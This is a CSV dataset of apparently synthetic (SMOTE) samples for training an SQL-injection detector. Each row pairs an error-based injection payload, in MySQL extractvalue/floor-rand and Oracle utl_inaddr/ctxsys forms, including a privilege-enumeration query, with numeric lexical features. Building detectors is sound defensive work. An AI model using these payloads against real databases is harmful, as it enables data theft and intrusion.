id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001618,attack,error,"1'   )    )    procedure analyse  (  extractvalue  (  9255,concat  (  0x5c,  (  benchmark  (  5000000,md5  (  0x52515a50   )    )      )    )     )  ,1  )   and    (    (   'ywxe' like 'ywxe",nearest_attack_euclidean,R000010,3.570653415692641,197.88292604610785,33.74188732038534,3.7117694240074837,63.657264084951834,28.455566895626173,81.77009506552984,24.0,0.32276681268074986,0.14255911749598182,0.413033106766846,0.12164096305642233,2.9717922548554987,0.0,0.3427359150481671,0.0,0.34273591504816714,0.34273591504816725,0.0,16.0,0.0,0.0,3.6572640849518327,1.0282077451445026,1.0,0.0,0.0,0.3427359150481672,0.0,0.34273591504816714,1.0,0.0,0.0,1.0,0.0,0.34273591504816703,0.0,0.0,0.0,0.657264084951833,0.34273591504816714,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6572640849518329,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.34273591504816714,0.0,0.34273591504816714,0.34273591504816714,4.028207745144501
SMOTE_001619,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,0.008148780393227861,209.00519984720182,31.01039969440363,3.9556850410812703,76.98180053479365,37.0,72.02209935060772,23.001299961800456,0.36832661508047104,0.17702917100553794,0.34459295045215277,0.11005126346183824,3.996100114598638,0.0,0.001299961800454219,0.0,0.001299961800454219,1.998700038199546,0.0,12.005199847201816,0.0,0.0,4.997400076399092,2.001299961800454,1.0,0.0,0.0,0.0012999618004539693,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9987000381995459,0.0012999618004540525,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0012999618004541635,0.0,1.0,1.0,5.001299961800454
SMOTE_001620,attack,error,"1' or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and 'kdxg' like 'kdxg",nearest_attack_euclidean,R000007,0.9330095788873082,316.82415396883175,38.21245299826843,4.028618785551869,110.66301701904725,55.0,115.67396596190551,35.487170987879026,0.3497909802658591,0.17368871105773243,0.3646561417674787,0.11186416690892981,4.0,0.0,0.0,0.0,2.0,1.2124529982684322,0.0,20.84981199307373,0.4249059965368641,0.0,6.0,4.212452998268432,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.0,1.0,1.2124529982684322,0.7875470017315678,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001621,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,0.24557681754371438,209.34906676753235,31.27149637474739,3.9475893167995784,76.45700725050523,37.0,72.81448912424216,23.077570392784967,0.3653403356800755,0.17675002259780745,0.34768217856337047,0.11022746315874664,3.883644410822548,0.0,0.03878519639248412,0.0,0.03878519639248412,1.9612148036075159,0.0,12.193925981962419,0.0,0.0,4.922429607215031,2.0387851963924835,1.0,0.0,0.0,0.03878519639248412,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.9612148036075159,0.03878519639248412,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.03878519639248412,0.0,1.0,1.0,5.038785196392484
SMOTE_001622,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,0.9385378378494942,348.7580909263812,34.0,3.5711199007585104,87.98705451779007,56.006472741104965,146.01294548220994,58.75161818527624,0.2523583706961304,0.16056359649344107,0.4186197388129943,0.1684582939974343,0.24838181472375886,0.7516181852762412,2.0,0.0,0.0,3.0,0.0,29.503236370552482,0.0,0.7451454441712764,0.7516181852762411,25.0,0.24838181472375875,0.7516181852762414,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001623,attack,error,"-4838'   )    )    or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000005,1.3228918348250023,221.9680685926179,39.64057632804413,3.844783328650294,66.52316980424274,39.56230531217654,91.56230531217655,24.320288164022067,0.29938727226089995,0.17787685297112465,0.41292371236340386,0.10981216240457153,0.6797118359779319,0.3202881640220679,1.0,0.0,1.0,1.320288164022068,0.0,16.0,0.0,0.0,3.0,3.3202881640220676,0.679711835977932,0.32028816402206794,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.32028816402206794,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,6.320288164022068
SMOTE_001624,attack,error,"-9740""   )    )    as pxkx where 5305  =  5305 or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000024,2.838086784903942,237.84247580932796,37.39140092494624,3.9190262039010144,77.15752419067204,45.0,90.68495161865593,25.0,0.32469092669542315,0.18924156095648903,0.3809333118167051,0.10513420053138278,0.9021497687634398,0.5489251156182801,0.5489251156182802,0.0,0.54892511561828,2.0,0.0,15.09785023123656,0.0,0.0,3.90214976876344,4.0,0.45107488438171994,0.5489251156182802,0.0,0.5489251156182801,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.45107488438172,0.0,1.0,0.0,0.0,0.54892511561828,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.54892511561828,0.0,1.0,1.0,6.54892511561828
SMOTE_001625,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,2.7880824850252344,203.38956570692557,31.0,3.868708306355517,73.16128179947538,33.161281799475375,73.77171609254984,23.29528601542497,0.359096231091843,0.16205726428945122,0.36399496178404117,0.1148515428346646,4.0,0.0,0.0,0.0,0.0,1.409427969150058,0.0,13.181144061699884,0.0,0.0,4.704713984575029,1.4094279691500589,1.0,0.0,0.0,0.0,0.0,0.704713984575029,1.0,0.0,0.0,1.0,0.0,0.704713984575029,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.295286015424971,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.704713984575029,0.704713984575029,4.409427969150058
SMOTE_001626,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000014,2.7469093053281726,225.56163300260334,34.205480999628094,3.824657885275869,70.55249800322316,42.99086500061984,86.21461599900826,25.803653999752065,0.3108180301661922,0.19049373871489694,0.3838450424251004,0.11484318869381044,1.1963460002479356,0.40182699987603204,0.8036539997520642,0.0,0.40182699987603204,2.0,0.0,14.803653999752065,0.0,0.0,4.598173000123968,4.401826999876032,0.5981730001239679,0.4018269998760322,0.4018269998760321,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,2.401826999876032,0.0,1.0,0.4018269998760321,0.4018269998760322,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.5981730001239679,0.5981730001239679,6.401826999876032
SMOTE_001627,attack,error,"1%' and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )   and '%'  =  '",nearest_attack_euclidean,R000019,1.5677674960073742,343.0,34.0,3.5380841402836896,84.0,49.0,148.0,62.0,0.24489795918367346,0.14285714285714285,0.4314868804664723,0.18075801749271136,2.6621397486448304,1.3378602513551694,0.0,0.0,0.0,3.0,0.0,30.0,1.9999999999999996,0.0,1.0,23.0,0.6655349371612076,0.3344650628387924,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001628,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.11574610466171749,252.79918630042013,43.882847443943426,4.458651456603172,147.09206769056155,2.0,76.82427116591515,26.882847443943426,0.5816994865428349,0.007918406480336398,0.3040336314925529,0.10634847548427576,3.0,0.0,0.0,0.0,0.0,3.9707118609858565,0.0,10.0,0.0,6.91213558295757,1.0,3.9707118609858574,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9707118609858565,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.9707118609858565
SMOTE_001629,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.2651844007291217,276.90026611624614,36.080562947673506,4.023188129295298,108.04028147383676,35.805629476735035,98.77238484881707,34.28197031685726,0.3909730431551062,0.12899490699292,0.35616965144192236,0.12386239841005149,4.0,0.0,0.0,0.0,2.0,2.0,0.0,18.32225179069401,0.0,1.9194370523264968,5.040281473836751,4.040281473836752,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.120844421510255,0.1208444215102552,0.0,1.9597185261632482,1.9597185261632482,0.040281473836751625,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9597185261632482,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.161125895347007
SMOTE_001630,attack,error,1' where 6913  =  6913 and 4386  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4386  =  4386  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   --,nearest_attack_euclidean,R000003,1.0765231351179816,341.6501658971037,34.51535909275327,3.6588652122541965,93.48464090724673,51.71160226811681,138.71160226811682,57.742320453623364,0.2736606034457165,0.15129250907939415,0.40601082204387795,0.16903606543101138,0.7423204536233627,0.0,2.2576795463766373,0.0,0.0,2.7423204536233627,0.0,28.0,0.0,3.0,0.0,25.0,0.7423204536233627,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.7423204536233627,1.0,0.7423204536233627,0.2576795463766372,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.742320453623362
SMOTE_001631,attack,error,"1'+  (  select 'nhlx' where 2291  =  2291 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   +'",nearest_attack_euclidean,R000020,0.5988839977514743,304.74816684504873,38.0,4.005853484088892,110.79355796325875,44.2386522204475,111.40629360623062,38.309663055111876,0.3643258272560425,0.14494628604814214,0.3649044900058181,0.1258233966899972,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.61932611022375,0.0,1.7935579632587504,5.103221018370625,5.8967789816293745,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,4.206442036741249,0.3096630551118744,0.8967789816293752,1.8967789816293752,0.1032210183706248,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.8967789816293752,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.309663055111875
SMOTE_001632,attack,error,"1%""   )    )     )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000015,2.794932175135301,262.93507282050473,32.99500560157729,3.686181841105069,81.36903472977919,36.201997759369085,109.97502800788644,35.389012323470034,0.3070939336399089,0.14006868101002876,0.4187354955125969,0.13410188983746543,0.0,4.0,0.0,0.0,0.7980022406309153,2.0,0.0,20.394006721892744,1.9999999999999996,0.7980022406309153,5.0,2.7980022406309146,0.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.7980022406309155,0.0,0.0,0.7980022406309153,1.3990011203154575,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3990011203154576,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.39900112031545765,0.0,0.6009988796845424,0.6009988796845424,6.995005601577288
SMOTE_001633,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  granted_role  )   FROM   (  SELECT DISTINCT  (  granted_role  )  , ROWNUM AS LIMIT FROM dba_role_privs WHERE GRANTEE  =  SYS.LOGINUSER  )   WHERE LIMIT  =  5   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000002,0.2385314046934258,251.52534411958817,43.7585701580086,4.4501370987070565,146.12891872456666,2.0,76.6378552370129,26.758570158008602,0.5806623493834032,0.007965496871849886,0.3049714194113524,0.10640073433339442,3.0,0.0,0.0,0.0,0.0,3.9396425395021506,0.0,10.0,0.0,6.818927618506451,1.0,3.9396425395021506,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,1.9396425395021502,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.939642539502151
SMOTE_001634,attack,error,"1'   )    )     )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and    (    (     (  'fvbv'  =  'fvbv",nearest_attack_euclidean,R000026,2.04833702545763,339.8869877861299,38.96521245482159,3.913231033579763,109.32173748494053,57.57389987952425,133.9217753313083,39.069575090356814,0.32190203020188135,0.1698024166982928,0.3934866714994287,0.11480888160039712,2.713050060237877,0.3217374849405307,0.6434749698810617,0.0,2.0,2.0,0.0,24.391312575297345,0.0,0.0,6.0,5.643474969881061,0.6782625150594692,0.3217374849405308,0.3217374849405308,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,6.0,3.0,0.3217374849405308,1.0,1.0,0.6782625150594692,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_001635,attack,error,"1' procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and 'tuzl'  =  'tuzl",nearest_attack_euclidean,R000018,2.0565934276721323,210.3123401372036,33.6246802744072,3.9079309114597227,72.4068095197874,37.0,77.57744558311529,23.3280850343009,0.344586854439223,0.17594275029591994,0.368560272187983,0.11091012307687412,3.0157448970973,0.0,0.3280850343008999,0.0,0.32808503430089986,1.6719149656991001,0.0,13.312340137203599,0.0,0.0,4.343829931398201,2.3280850343008996,1.0,0.0,0.0,0.32808503430089986,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.6719149656991001,0.3280850343008998,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.32808503430089975,0.0,1.0,1.0,5.3280850343009
SMOTE_001636,attack,error,"1' and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and 'rxdz'  =  'rxdz",nearest_attack_euclidean,R000006,0.2840694245025978,275.0018560989799,36.200371219795976,4.028567154198651,107.949907195051,35.40074243959195,97.60111365938793,34.050092804948996,0.3926470295540264,0.12866500899975047,0.35485283654937244,0.12383512489685074,3.8497215851530173,0.0,0.10018560989798853,0.0,2.0,2.0,0.0,18.100185609897988,0.0,2.0,5.0,4.100185609897989,1.0,0.0,0.05009280494899426,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,3.0,0.0,0.05009280494899426,2.0,1.8998143901020113,0.05009280494899426,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.9999999999999998,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_001637,attack,error,"-5996  )   or 5023  =  ctxsys.drithsx.sn  (  5023,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  5023  =  5023  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000008,0.08213396311941769,334.9424921711569,34.03833855256205,3.480052508788689,80.23003131537232,51.923322894875895,145.7891379609087,57.0,0.2395402006559717,0.15501981277542945,0.4352612602042394,0.17017872636435943,0.0,0.0,1.0383385525620537,0.0,0.0,2.0,0.0,30.94249217115692,0.0,0.057507828843080366,0.9808307237189733,23.038338552562053,0.0,0.0,0.019169276281026826,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
SMOTE_001638,attack,error,"1"" where 2131  =  2131 and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  --",nearest_attack_euclidean,R000016,2.368802915868868,348.6087087021977,34.92752753186818,3.6307367467949674,92.02892895714317,52.82612610659319,144.28988987252728,59.46376376593409,0.2640739084941219,0.15148166110565953,0.4138606222104511,0.1705838081897675,0.0,2.391291297802267,1.5362362340659108,0.0,0.0,3.0,0.0,29.07247246813182,0.0,1.3912912978022678,0.5362362340659108,24.53623623406591,0.0,1.0,0.5362362340659108,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.5362362340659108,1.0,1.0,0.4637637659340892,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_001639,attack,error,"-6236'   )    )     )   or 1 group by concat  (  0x7171706a71,  (  select   (  case when   (  4232  =  4232  )   then 1 else 0 end   )    )   ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )    having min  (  0  )  #",nearest_attack_euclidean,R000031,1.827459274986225,222.9520966348288,36.452469801616004,3.796913831041031,68.57110871418239,39.476048317414396,89.90493960323201,25.0,0.30668312576839857,0.1767143212912192,0.4043505811665,0.11225197177388223,1.3095060396767995,0.0,0.6904939603232003,0.0,0.6904939603232005,1.3095060396767995,0.0,16.0714818809696,0.0,0.0,3.6190120793535994,3.3095060396767995,1.0,0.0,0.0,0.6904939603232005,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.3095060396767995,0.0,0.3095060396767996,0.0,0.0,0.6904939603232004,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.6904939603232004,0.0,1.0,1.0,6.0
SMOTE_001640,attack,error,"1'  )   and 6055  =  ctxsys.drithsx.sn  (  6055,  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  6055  =  6055  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )     )  ",nearest_attack_euclidean,R000027,0.7768839315964203,334.933887503273,33.16115729193942,3.4867486046509004,83.09504479521242,49.64462916775767,145.0330562483635,57.16115729193942,0.24795234390077575,0.1481908084188791,0.433178048963983,0.17067879871636216,1.0,0.0,0.322314583878834,0.0,0.0,2.161157291939417,0.0,30.516528124181747,0.0,0.483471875818251,0.8388427080605831,22.48347187581825,1.0,0.0,0.16115729193941697,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.161157291939417,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.161157291939417
SMOTE_001641,attack,error,-7810 or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )   -- vuvj,nearest_attack_euclidean,R000011,1.8955256755832623,333.32719233285655,35.11520511142897,3.58932290875498,86.69123066857381,49.76958977714206,139.86637188714067,57.0,0.26016352173479323,0.14928788503896825,0.4195420293256165,0.17100656390062197,0.0,0.0,2.115205111428969,0.0,0.0,2.0,0.0,29.327192332856548,0.0,1.6728076671434537,0.44239744428551564,24.11520511142897,0.0,0.0,0.5576025557144846,0.0,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.0
